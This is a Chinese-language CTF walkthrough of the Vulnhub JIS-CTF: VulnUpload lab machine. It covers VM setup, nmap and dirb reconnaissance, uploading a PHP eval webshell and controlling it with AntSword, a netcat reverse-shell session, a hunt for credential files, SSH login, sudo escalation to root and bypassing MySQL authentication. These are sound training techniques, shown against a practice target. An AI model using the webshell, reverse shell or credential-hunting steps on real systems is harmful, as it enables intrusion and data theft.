原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/uZyGiZ1USbMmkyt6W7OYjQ)

**前文**

跟着 Cream 老师兼好友学习，详细介绍了 Oracle 数据库注入漏洞和致命问题，包括各种类型的注入知识。这篇文章将开启渗透靶场的学习，详细讲解 Vulnhub 靶机渗透的环境搭建和 JIS-CTF 题目，采用 Nmap、Dirb、中国蚁剑、敏感文件分析、SSH 远程连接、Shell 提权等获取 5 个 flag。本文是一篇 Web 渗透的基础性文章，希望对您有所帮助。

作者作为网络安全的小白，分享一些自学基础教程给大家，希望你们喜欢。同时，更希望你能与我一起操作深入进步，后续也将深入学习网络安全和系统安全知识并分享相关实验。总之，希望该系列文章对博友有所帮助，写文不容易，大神请飘过，不喜勿喷，谢谢！

> 从 2019 年 7 月开始，我来到了一个陌生的专业——网络空间安全。初入安全领域，是非常痛苦和难受的，要学的东西太多、涉及面太广，但好在自己通过分享 100 篇 “网络安全自学” 系列文章，艰难前行着。感恩这一年相识、相知、相趣的安全大佬和朋友们，如果写得不好或不足之处，还请大家海涵！  
> 接下来我将开启新的安全系列，叫 “系统安全”，也是免费的 100 篇文章，作者将更加深入的去研究恶意样本分析、逆向分析、内网渗透、网络攻防实战等，也将通过在线笔记和实践操作的形式分享与博友们学习，希望能与您一起进步，加油~
> 
> 推荐前文：网络安全自学篇系列 - 100 篇
> 
> https://blog.csdn.net/eastmount/category_9183790.html

话不多说，让我们开始新的征程吧！您的点赞、评论、收藏将是对我最大的支持，感恩安全路上一路前行，如果有写得不好或侵权的地方，可以联系我删除。基础性文章，希望对您有所帮助，作者目的是与安全人共同进步，加油~

文章目录：

*   **一. Vulnhub 简介**
    
*   **二. JIS-CTF 题目描述**
    
*   **三. Vulnhub 环境配置**
    
*   **四. Vulnhub 靶机渗透详解**

    1.信息收集

    2.First flag

    3.Second flag

    4.Third flag 一句话木马 蚁剑提权

    5.Fourth flag

    6.Fifth flag

    7.sudo 提权

    8.获取数据库数据

作者的 github 资源：  

*   逆向分析：https://github.com/eastmountyxz/
    
    SystemSecurity-ReverseAnalysis
    
*   网络安全：https://github.com/eastmountyxz/
    
    NetworkSecuritySelf-study
    

> 声明：本人坚决反对利用教学方法进行犯罪的行为，一切犯罪行为必将受到严惩，绿色网络需要我们共同维护，更推荐大家了解它们背后的原理，更好地进行防护。该样本不会分享给大家，分析工具会分享。

一. Vulnhub 简介

Vulnhub 是一个提供各种漏洞环境的靶场，每个靶场有对应的目标和难度，挑战者通过网络闯入系统获取 root 权限和查看 flag。Vulnhub 中包含了各种各样的镜像，可以下载到自己的主机上练习，其大部分的环境是要用 VMware 或者 VirtualBox 打开运行的。

作者看了 Vulnhub 的题目，是一个非常棒的 Web 渗透靶场，每个靶机都是很酷的一个游戏，需要找到所有的 flag 和提权，而 Hack the box 速度堪忧。为了让更多朋友了解 Web 渗透基础知识，作者接下来会陆续分享该系列 20 篇文章，尽量选择技术含量较高的靶场，结合技术点进行讲解，希望你们喜欢~

*   官方网址：https://www.vulnhub.com
    

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDROMRlYqhkCenSmmvHpEHwEPLARqFMNEsTDS26ImKvUACyYSSedoQD1DxUxhbbgz77dZ2VYMmGJNhw/640?wx_fmt=png)

该网站包含了很多靶场题目，每个靶场有对应的镜像下载地址、描述和难度等级等。比如 “Me and My Girlfriend” 如下图所示：

*   https://www.vulnhub.com/entry/
    
    me-and-my-girlfriend-1,409/
    

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDROMRlYqhkCenSmmvHpEHwEP2zCqHnea3whicYdb4wC5A9siadkCsj6CxF2LU7ezWAibsXBAqgaicjEfsQ/640?wx_fmt=png)

二. JIS-CTF 题目描述
===============

靶场题目：JIS-CTF: VulnUpload

靶场地址：https://www.vulnhub.com/

entry/jis-ctf-vulnupload,228/

难度描述：包含 5 个 Flag，初级难度，查找所有 Flag 平均需要 1.5 小时

靶场作者：Mohammad Khreesha

靶场描述：Description: There are five flags on this machine. Try to find them. It takes 1.5 hour on average to find all flags.

下载地址：

*   Download (Torrent)：https://download.vulnhub.com/
    
    jisctf/JIS-CTF-VulnUpload-CTF01.ova.torrent
    
*   Download (Mirror)：https://download.vulnhub.com/
    
    jisctf/JIS-CTF-VulnUpload-CTF01.ova
    

打开网址显示的内容如下图所示，我们获取虚拟机格式的镜像，然后进行环境配置。

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDROMRlYqhkCenSmmvHpEHwEPC1pYGQ25XTPPK9LT4nPDWyE4ZZ9SWqqa35XUSe9ibrg1p2hbZSoHwgQ/640?wx_fmt=png)

描述中显示 “Only working with VirtualBox”，只能工作在 VirtualBox 中工作，但作者是在 VMware 虚拟机中完成的实验。读者结合自身环境进行渗透测试。

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDROMRlYqhkCenSmmvHpEHwEP6VVnWicQT1TAUzDVickcnQwlHTsum81L7lArpAOibBf8PjJSQZtzOMubQ/640?wx_fmt=png)

三. Vulnhub 环境配置
===============

第一步，下载资源

建议采用迅雷打开下载 JIS-CTF-VulnUpload-CTF01.OVA 文件。

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDROMRlYqhkCenSmmvHpEHwEPWmBPoC718w9VQMia2ND2qoZAMnTnjxx9kHfiaRBkxzDNUAicNLrZGzw7w/640?wx_fmt=png)

下载完成之后如下图所示，可以看到一个 OVA 后缀的文件。

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDROMRlYqhkCenSmmvHpEHwEPaCYJjLiadVhl2ibjfiasEZiaACGNGKu4HRvAWlvsocJBrxKKjx9GhaOWxg/640?wx_fmt=png)

第二步，打开 VMware 虚拟机安装靶场  
找到我们刚才下载的文件，导入虚拟机。

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDROMRlYqhkCenSmmvHpEHwEPhgUNBwgkkLibn8JmBZ7H6lD1V2zibtavSFEzOvPzobsBuXmibPEgKjY3w/640?wx_fmt=png)

选择存放的位置，然后点击导入。

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDROMRlYqhkCenSmmvHpEHwEPC8oXrVWR1rXud9sJJLV2ly7IhwrPiaYSSNwPXHPibHjtO4kedBTqLfFA/640?wx_fmt=png)

如果出现未通过 OVF 规范一致性或虚拟硬件合规性检查，请单击 “重试” 导入。在编程或 Web 渗透过程中，我们会遇到各种问题和错误，需要学会谷歌和百度独立解决，这也是对你能力的一种提升。

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDROMRlYqhkCenSmmvHpEHwEP9JdKHtxgKVgwNJqvYgy1Ym8Xj9RsLLZNdHAmWxv66CXoyY4D6d1NRg/640?wx_fmt=png)

第三步，导入完成之后，设置 NAT 网络模式，内存设置为 2G，硬盘设置为 32GB

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDROMRlYqhkCenSmmvHpEHwEP75iarWotDR92MUxJia07NsnexPricicq38pbANZ2yCSRwTMgXtWVL3Zykg/640?wx_fmt=png)

第四步，点击开启虚拟机及配置过程  
到开机页面选择第二个 Ubuntu 的高级选项，如果启动网络正常的话可以直接开机，如果网络不正常可以按下面步骤操作。

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDROMRlYqhkCenSmmvHpEHwEPXbeibJzDclOkAVicWpRsZtZvptVwk2OWQxB9wKkBot9uZic35zoGpM4BA/640?wx_fmt=png)

进入高级选项，再次选择第二个 Linux 内核版本的恢复模式回车。

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDROMRlYqhkCenSmmvHpEHwEPvpRQCCCfrGMahWEiacHcaTqibXL0XeviaKn5JBwwcZuJ0DCc4JEiaVgibPA/640?wx_fmt=png)

等待系统启动完毕后，看到这个页面，我们继续回车进入。

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDROMRlYqhkCenSmmvHpEHwEPFBBhvibxazxunwTRz7VGicVKuX0L06RFIfx6zTEfxm19WicYdojPdSI3w/640?wx_fmt=png)

回车后会弹出选择界面，我们选择 root 一行回车，接着再次回车进入命令行模式。

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDROMRlYqhkCenSmmvHpEHwEPwiaE3eI0vLraUPiagG9hY8zTeBRnPgiaJUvStzgaCPSpWTkIax5UnvrUw/640?wx_fmt=png)

第五步，输入 “mount -o rw,remount /” 命令，再配置网络问卷，否则后面可能无法保存网络配置文件

> 当 Linux 系统无法启动时，通常需要进入单用户模式修改一些配置文件，或调整一些参数方可启动。但是在进入单用户模式后，我们的文件系统是只读模式，无法进行修改，那么这个时候就需要用到一条命令 “mount –o remount,rw /”。这个命令让我们的 / 路径文件系统的可读模式能自由修改。

*   mount -o rw,remount /
    

接着输入命令查看网卡：

*   ifconfig -a
    

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDROMRlYqhkCenSmmvHpEHwEPomI4aCAMcBRUwLRiaEBQArXrqujbwx3xb6vywH5J9iaoBOgDn9vTt18w/640?wx_fmt=png)

作者的是 ens33，然后继续输入命令修改网络配置文件。

*   vi /etc/network/interfaces
    

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDROMRlYqhkCenSmmvHpEHwEPov1MpMJmtiakERyd8s2FyoSvzL9S7VQeGa5AON3R2zEQ2U1S4m4j2EA/640?wx_fmt=png)

输入 I 修改模式，如下图所示。

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDROMRlYqhkCenSmmvHpEHwEPYQrIH1aiaOk5iazribEpUgY9L4Vf3vhfTwY4fY7xnl19zJTIvumicdJdCg/640?wx_fmt=png)

修改这两个地方，改成你的网卡名称，然后输入 “:wq” 保存。

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDROMRlYqhkCenSmmvHpEHwEPwGDs5eVurfoSmalXia3Po1G5u9ialpOH2hqRqHxtveEs1sNQaxz5PKKg/640?wx_fmt=png)

最后输入 reboot 重启即可。

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDROMRlYqhkCenSmmvHpEHwEPruZ1ojGQYUiaLkLCSicXaouyLlpe53FJNIQ7O7RakCoU2aSBh71QTlBg/640?wx_fmt=png)

运行结果如下图所示，我一直登录不进去（不知道用户名和密码）。最初以为是要求用 VirtualBox 虚拟机的原因，后来反应过来，此时似乎 Kali 上场开始渗透了。

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDROMRlYqhkCenSmmvHpEHwEPdgHuzz7CfPQn1YFCwEfroriciao0MXpmy8oASWes2JqicNX4iceA0TqEFA/640?wx_fmt=png)

四. Vulnhub 靶机渗透详解
=================

1. 信息收集
-------

首先是信息收集一波，任何网站或 Web 都需要进行一波扫描和分析。

第一步，扫描网卡名称

*   **netdiscover -i**
    

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDROMRlYqhkCenSmmvHpEHwEPqxmd3g6Oea2QxORhEFSbWv1SEDQ2wIj0Lb3CiaJZmqciaNOk4CUO9BuQ/640?wx_fmt=png)

第二步，调用 Nmap 探测目标主机 IP

*   **nmap -sn 192.168.44.0/24**
    

由于在同一个网段，所以和主机 IP 地址近视，扫描结果如下图所示，靶场 IP 为 192.168.44.143。

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDROMRlYqhkCenSmmvHpEHwEP8X04PFWMxvyDk6c0k9O87U6EU1XaSanIibtTicmmZ58UreicrBTHFuwpw/640?wx_fmt=png)

第三步，调用 Nmap 探测靶机的开放端口信息

*   **nmap -A 192.168.44.143**
    
*   22 端口：SSH 远程连接
    
*   80 端口：HTTP 网站协议
    

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDROMRlYqhkCenSmmvHpEHwEPRaRVrV81DYib5gdiaiaS4wRzlpo9qxFWn0uvbvXlrGTR7WSl8vIjxthDw/640?wx_fmt=png)

第四步，利用 dirb 扫描 80 端口的目录文件，敏感文件分析非常重要

*   **dirb http://192.168.44.143**
    

相关目录：

*   http://192.168.44.143/admin_area/
    
*   http://192.168.44.143/assets/
    
*   http://192.168.44.143/css/
    
*   http://192.168.44.143/flag/
    
*   http://192.168.44.143/index.php
    
*   http://192.168.44.143/js/
    
*   http://192.168.44.143/robots.txt
    
*   http://192.168.44.143/flag/index.html
    
*   http://192.168.44.143/admin_area/
    
    index.php
    

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDROMRlYqhkCenSmmvHpEHwEPwj2TGicicJ0r9qSSibPwKuBCEZPrQib6BnZUZac6rzsEfzufDsBTMrVAqA/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDROMRlYqhkCenSmmvHpEHwEPvsYWmbMoLSplaJiaTzIwiaVCAZOBjic2PD9CwAekATgoOvRVw1hpKnP9w/640?wx_fmt=png)

第五步，调用 whatweb 查看环境

*   **whatweb 192.168.44.143/login.php**
    

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDROMRlYqhkCenSmmvHpEHwEPJWsHjjMiaxicibKpbNysSsQKO9VG46p6hJh7LAl2YFTRapRhhOEbnDaGw/640?wx_fmt=png)

第六步，敏感文件分析

*   登陆界面：  
    192.168.44.143/index.php
    
    192.168.44.143/login.php
    

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDROMRlYqhkCenSmmvHpEHwEPZ1ClD9HgNMBcWu1CRiacRvGxL6cS6iau8BJecl7MtKEqk9QObDhiaLN5A/640?wx_fmt=png)

*   系统信息：发现目录浏览漏洞，以及 apache 版本信息  
    192.168.44.143/assets/
    

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDROMRlYqhkCenSmmvHpEHwEP5VTueFnXHfUDU7ZkmFuZpIr7cyAk58iaonu8FCNBtibebdJfiaqhp9xUQ/640?wx_fmt=png)

*   robots.txt 文件发现目录泄露，其中 flag 文件夹应该有问题  
    192.168.44.143/robots.txt
    

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDROMRlYqhkCenSmmvHpEHwEPiaaQ9IZqMibXy9T8yHa9UbRSZfKoDWUMeteRunZ9ia0w3HjoeSLXrnIQw/640?wx_fmt=png)

做到这里，信息扫描步骤基本介绍，接下来开始靶机渗透。

2.First flag
------------

我们从敏感文件 robots.txt 中获取目录信息，查看内容如下图所示：

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDROMRlYqhkCenSmmvHpEHwEPiaaQ9IZqMibXy9T8yHa9UbRSZfKoDWUMeteRunZ9ia0w3HjoeSLXrnIQw/640?wx_fmt=png)

接着我们发现一个敏感的关键词 flag，输入目标地址：192.168.44.143/flag/，第一个 flag 浮出水面，比较基础，是敏感文件和目录相关。

The 1st flag is : {87345xxx2095}

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDROMRlYqhkCenSmmvHpEHwEPeic9FlXH2AMib7CIX4icvWSIIF03doUltBBP6CWDibRfvUTPmh6ibowjFyw/640?wx_fmt=png)

3.Second flag
-------------

在地址栏中输入网址，显示如下图所示：

*   http://192.168.44.143/admin_area/
    

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDROMRlYqhkCenSmmvHpEHwEP5OeAHuQHUUUib362YepWJZXdHlK58IOCXRHchHW535OwR26Rybd6zaA/640?wx_fmt=png)

右键查看源码得到第二个 flag，也是比较简单的知识点。  
The 2nd flag is : {7412574xxx895214}

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDROMRlYqhkCenSmmvHpEHwEPlMnllxQ0eMGdRSlLFnHS1pjGZbelWIle9IDJI0Vy4mbXP09GxFLVjg/640?wx_fmt=png)

与第二个 flag 同时出现的还有一个账号和密码，说明接下来我们需要利用这个账号信息。

```
<html><head><title>Fake admin area :)</title><body><center><h1>The admin area not work :) </h1></center><!--	username : admin	password : 3v1l_H@ck3r	The 2nd flag is : {7412574125871236547895214}--></body></html>
```

4.Third flag
------------

### 登录分析

我们之前打开了登录页面，但没有账号和密码。这里是否能用上面的账号和密码呢？接着我们进行了登录尝试，返回页面是一个文件上传。

*   http://192.168.44.143/login.php
    
*   username : admin
    
*   password : 3v1l_H@ck3r
    

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDROMRlYqhkCenSmmvHpEHwEPYtqHlKaODblziaLhiaG2oS0CA4wic6BdNyHkCYXdicVgVoLNWNFe7nFCrg/640?wx_fmt=png)

### 上传一句话木马

登录之后是一个上传页面，我们尝试上传一句话木马。

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDROMRlYqhkCenSmmvHpEHwEPENjbTShBxadpicWqIKCpP9okwsE5NxfhEib0ZXqDDWTgWKlKalZriaM2Q/640?wx_fmt=png)

```
<?php @eval($_POST["eastmount"]); ?>
```

由于该网站采用 PHP 编写，一句话木马如下所示，我们在 Kali 浏览器中打开并上传。

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDROMRlYqhkCenSmmvHpEHwEPPOyQeWOqTo81ic8J3aMFiaKDic4F8IvFClbcria2yA9cm0ib3jBjroxQeQQ/640?wx_fmt=png)

上传文件成功。

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDROMRlYqhkCenSmmvHpEHwEPYXcK2nOhupQiafDxNlc6hY3W651yicvpl36IcPrc0VqibcElzwpQK5BXQ/640?wx_fmt=png)

接下来我们用要蚁剑来连接。

*   **http://192.168.44.143/**
    
    **uploaded_files/shell.php**
    

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDROMRlYqhkCenSmmvHpEHwEPiaaQ9IZqMibXy9T8yHa9UbRSZfKoDWUMeteRunZ9ia0w3HjoeSLXrnIQw/640?wx_fmt=png)

### Kali 系统安装中国蚁剑

接着我们需要使用中国蚁剑来提取 Webshell。蚁剑怎么在 Kali 下安装和使用呢？中国蚁剑推荐大家阅读如下文章，它是非常强大的一款渗透工具。

*   中国蚁剑安装 - 付星 fx
    
*   https://github.com/AntSwordProject/AntSword-Loader
    
*   Kali 安装中国蚁剑（antSword） - zrools
    

第一步，下载中国蚁剑可以使用 git 命令，也可以直接从 github 中下载。

```
git clone https://github.com/antoor/antSword.gitcd antSword
```

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDROMRlYqhkCenSmmvHpEHwEPnaickTrIT3OUKdibR4j5A5y5LjmqmkvFYqhuxYkiaVIgO7iaXbgH4NeYEg/640?wx_fmt=png)

作者从官网下载对应的 Linux 版本。

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDROMRlYqhkCenSmmvHpEHwEPgSXPek7aHPibgWaiaxnCtd9ku2h36WuaiaeKSPyfU5Fh8uBAugsK0o0icg/640?wx_fmt=png)

第二步，打开 Kali 终端找到你下载的中国蚁剑压缩包并解压。

```
unzip AntSword-Loader-v4.0.3-linux-x64.zip
```

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDROMRlYqhkCenSmmvHpEHwEPSJiaicIic5icFwu18XljibgnjxJ4lJMSEf1kVxmiaDTKR4mXickQRCXSicYRWA/640?wx_fmt=png)

解压显示如下图所示：

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDROMRlYqhkCenSmmvHpEHwEPfGW9eKibbAmHomibvhmU3pSWLAD8lhzaOSIHj2DFZBSnXDVTjmsx7pXQ/640?wx_fmt=png)

第三步，进入中国蚁剑压缩包并打开蚁剑。

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDROMRlYqhkCenSmmvHpEHwEPtEV8E1l9FaGZxjVrDLOk9LE4Obkh5qF8OYMupRGte1qv90FchPhqfw/640?wx_fmt=png)

```
./AntSword
```

蚁剑打开如下图所示：

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDROMRlYqhkCenSmmvHpEHwEPeic7wlypUkItZjY0URsvRBfJYQkddrn2VkV9ZKx3icia9jibuw6qIaC4Zg/640?wx_fmt=png)

第四步，创建一个空文件夹（用全英文名字）。

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDROMRlYqhkCenSmmvHpEHwEPTsJjMaM4NNA5T8JOof7C3KyhANBhRaZeAcJjJ3wETFmImH5rGND0TQ/640?wx_fmt=png)

然后点击蚁剑 “初始化” 按钮，找到你新建的文件夹，并选择它进行安装。

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDROMRlYqhkCenSmmvHpEHwEPCqImicNlSP74ja35GyVUhDemlpmQDgcmyDbC1cfveIZ16sDVIyDY5uw/640?wx_fmt=png)

执行结束之后，“./AntSword” 会出现这个界面，说明安装成功。

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDROMRlYqhkCenSmmvHpEHwEPFmrnuWNnOyvtIiaAHiavAp4geH7Gw1lfAiaY82kZJib0QomtxGoChnRagQ/640?wx_fmt=png)

### 蚁剑提权

第一步，利用前面上传的一句话木马。

```
<?php @eval($_POST['eastmount']);?>
```

第二步，运行蚁剑，右键单击 “添加数据”，输入 URL 地址，连接密码以及编码设置。PHP 语言推荐编辑器使用 chr 加密。

```
URL：http://192.168.44.143/uploaded_files/shell.php密码：eastmount
```

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDROMRlYqhkCenSmmvHpEHwEPkrSORLwa5qPkp5pjvfZnKYtflfjGl7d8aiakfvDia0ibZVa1LBvk7D7Ng/640?wx_fmt=png)

接着整个后台显示出来，如下图所示，是不是感受到了蚁剑的强大。

第三步，右键文件管理查看 webshell 目录

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDROMRlYqhkCenSmmvHpEHwEP742yFAKPSNuDbL1Ik2sfaqoHaY0yTdiaGzypucvuggDYYSAIbMUNMicA/640?wx_fmt=png)

找到 / var/www/html / 目录下，看到 hint.txt 和 flag.txt 文件。

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDROMRlYqhkCenSmmvHpEHwEP1vpW6KbQynCvcibsRC4pLic1Lue64ec03iamk47qXakabia3tbAmUSiaK4Q/640?wx_fmt=png)

直接打开 hint.txt 文件，我们看到了第三个 flag 和用户名 technawi，该用户名又能做什么呢？

> try to find user technawi password to read the flag.txt file, you can find it in a hidden file 😉

The 3rd flag is : {76451xxxx345670}

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDROMRlYqhkCenSmmvHpEHwEPic0XhotRguicpkyxsrJhic7Fpkm1z4xCDguhmmtmibpiaPEzpLUBJru3MiaQ/640?wx_fmt=png)

注意，这里如果您对信息比较敏感，可能会通过直接访问 hint.txt 得到第三个 flag 和用户 technawi。但更推荐大家尝试中国蚁剑和一句话木马的渗透方法。

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDROMRlYqhkCenSmmvHpEHwEPo0I8RYhT0e85w9BZanmfvt7A8dmtavHeMt3CvklYcQuI3Nd85r4HFg/640?wx_fmt=png)

第四步，gobuster 目录扫描  
注意，hint.txt 文件是能够直接访问的，但 flag.txt 文件却无法访问。我们补充一个目录扫描知识点，使用 gobuster 依次扫各目录下的 txt 文件。robots.txt 和 hint.txt 目录为 200，表示能直接访问，其他目录均不能直接访问，flag.txt 提示 403。

*   /robots.txt (Status: 200)
    
*   /hint.txt (Status: 200)
    

```
root@kali:~#  gobuster dir -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -u http://192.168.44.143 -t 100 -x txt/assets (Status: 301)/css (Status: 301)/js (Status: 301)/flag (Status: 301)/flag.txt (Status: 403)/robots.txt (Status: 200)/uploaded_files (Status: 301)/hint.txt (Status: 200)/server-status (Status: 403)
```

那怎么才能获取 flag.txt 内容呢？此时你需要想到用户权限的限制和提取处理。

最后补充另一种提权方法，上传 php-reverse-shell 反弹 shell 到 kali 攻击机得到 shell。

```
root@redwand:~# rlwrap nc -lvp 6666listening on [any] 6666 ...192.168.0.149: inverse host lookup failed: Unknown hostconnect to [192.168.0.103] from (UNKNOWN) [192.168.0.149] 56148Linux Jordaninfosec-CTF01 4.4.0-72-generic #93-Ubuntu SMP Fri Mar 31 14:07:41 UTC 2017 x86_64 x86_64 x86_64 GNU/Linux 04:28:10 up 52 min,  0 users,  load average: 0.00, 2.25, 3.94USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHATuid=33(www-data) gid=33(www-data) groups=33(www-data)/bin/sh: 0: can't access tty; job control turned off$ python3 -c 'import pty;pty.spawn("/bin/bash")'www-data@Jordaninfosec-CTF01:/$
```

5.Fourth flag
-------------

刚才在第三个 flag 提示我们 “try to find user technawi password to read the flag.txt file, you can find it in a hidden file”，表示需要用 technawi 读取 flag.txt 文件，我们可以在隐藏文件中找到用户的信息。那怎么去实现呢？

第一步，我们在蚁剑中启动 shell 的命令行模式，命令 “2>/dev/null” 表示过滤掉类似没有权限的信息。

*   **find / -user ‘technawi’ 2>/dev/null**
    

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDROMRlYqhkCenSmmvHpEHwEPKJrvzVYhPsTVF9AyUOf4wudkZTfA0o5FEFtiaNzqBCWAmpWxIcINdCQ/640?wx_fmt=png)

我们看到了一个特殊的文件 / etc/mysql/conf.d/credentials.txt ，尝试去读一下里面的信息，得到 flag。

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDROMRlYqhkCenSmmvHpEHwEPsf1nFy2vewIWQCiaF2PJgibGPkgb9I2FSwJ7H3cgt95MOcT03ktB4a4A/640?wx_fmt=png)

```
(www-data:/var/www/html) $ find / -user 'technawi' 2>/dev/null/etc/mysql/conf.d/credentials.txt/var/www/html/flag.txt/home/technawi/home/technawi/.cache/home/technawi/.bash_history/home/technawi/.sudo_as_admin_successful/home/technawi/.profile/home/technawi/.bashrc/home/technawi/.bash_logout(www-data:/var/www/html) $ cat /etc/mysql/conf.d/credentials.txtThe 4th flag is : {7845658974123568974185412}username : technawipassword : 3vilH@ksor(www-data:/var/www/html) $
```

获取第四个 Flag 和 technawi 用户对应的密码。

*   The 4th flag is : {78456xxxx85412}
    
*   username : technawi
    
*   password : 3vilH@ksor
    

6.Fifth flag
------------

如果直接读取 flag.txt 文件，显示为空，需要对应的用户和权限。

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDROMRlYqhkCenSmmvHpEHwEPfzCyBqTxOvNsI1UhoibficAdRHodEkEkuNVbl9HvaqQuWvq6IWDQITCQ/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDROMRlYqhkCenSmmvHpEHwEPI7x0DRCdKyEMiaVtCib7epHwJa4ib6H4RibF6YqPnZq6STKVH3giblhYkwA/640?wx_fmt=png)

接着我们采用 SSH 连接，账号和密码为第 4 个 flag 获取的值。

*   username : technawi
    
*   password : 3vilH@ksor
    
*   ssh technawi@192.168.44.143
    

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDROMRlYqhkCenSmmvHpEHwEPHFVcT1G0ib0t8ecvZ5nsYFUuiavnzWcFF0ze3ZdBCzNibUU9T5B7mCcVA/640?wx_fmt=png)

找到登陆用户 technawi，然后去读取刚才 flag.txt 文件 ，得到最后的 flag。

*   cat /var/www/html/flag.txt
    
*   The 5th flag is : {547321xxxx6975249}
    

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDROMRlYqhkCenSmmvHpEHwEPiaYAwW9U7lyOHgKSQ5o5NLhP0OIibT6tXYrKxTU83ctCCeiaQ0FvUPWdA/640?wx_fmt=png)

7.sudo 提权
---------

在 Web 渗透中，提权和数据库获取也是非常重要的知识点。尽管 Vulnhub 是渗透靶场，但获取 flag 并不是我们的唯一目标，提权也很有意思。前面我们在 home 目录下发现 .sudo_as_admin_successful 文件，表示需要使用 sudo 提权。

*   root 权限可以直接使用 sudo su - 获得
    

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDROMRlYqhkCenSmmvHpEHwEPr5IBZ80nfe2YE9vYibO0BCLqUicPlfLWVgFzeUjx4BicJCaryrS8wqJ7A/640?wx_fmt=png)

首先我们使用 sudo -l 看看 sudo 权限。

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDROMRlYqhkCenSmmvHpEHwEPc8nwFrShhJZQD8Mw7G8ROPgl2voacADw79oeOfc1ztBxAsSBial7CHQ/640?wx_fmt=png)

显示 “ALL” 说明 technawi 可以用自己的密码切换为 root 用户，输入 “sudo su root” 命令，密码为 3vilH@ksor。权限成功从 technawi 提升为 root。

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDROMRlYqhkCenSmmvHpEHwEPVleL40Bq5deecKl8icFHK78vW7A6Ienz6hX2siakDTRiae8S0EDLqocLg/640?wx_fmt=png)

8. 获取数据库数据
----------

同样数据库操作也非常有意思，我们尝试获取 mysql 数据库内容。

核心步骤为：登录 root 权限，新建目录并使用命令跳过输入密码过程

*   **mkdir -p /var/run/mysqld**
    
*   **chown -R mysql:mysql /var/run/mysqld**
    
*   **mysqld_safe --skip-grant-tables &**
    

```
technawi@Jordaninfosec-CTF01:/var/www$ sudo su rootroot@Jordaninfosec-CTF01:/var/www# whoamirootroot@Jordaninfosec-CTF01:/var/www# lshtmlroot@Jordaninfosec-CTF01:/var/www# mkdir -p /var/run/mysqldroot@Jordaninfosec-CTF01:/var/www# chown -R mysql:mysql /var/run/mysqldroot@Jordaninfosec-CTF01:/var/www# mysqld_safe --skip-grant-tables &[1] 1910root@Jordaninfosec-CTF01:/var/www# 2020-04-10T06:31:09.933846Z mysqld_safe Logging to syslog.2020-04-10T06:31:09.936319Z mysqld_safe Logging to '/var/log/mysql/error.log'.2020-04-10T06:31:09.941145Z mysqld_safe Logging to '/var/log/mysql/error.log'.2020-04-10T06:31:09.959551Z mysqld_safe A mysqld process already exists
```

输出结果如下图所示：

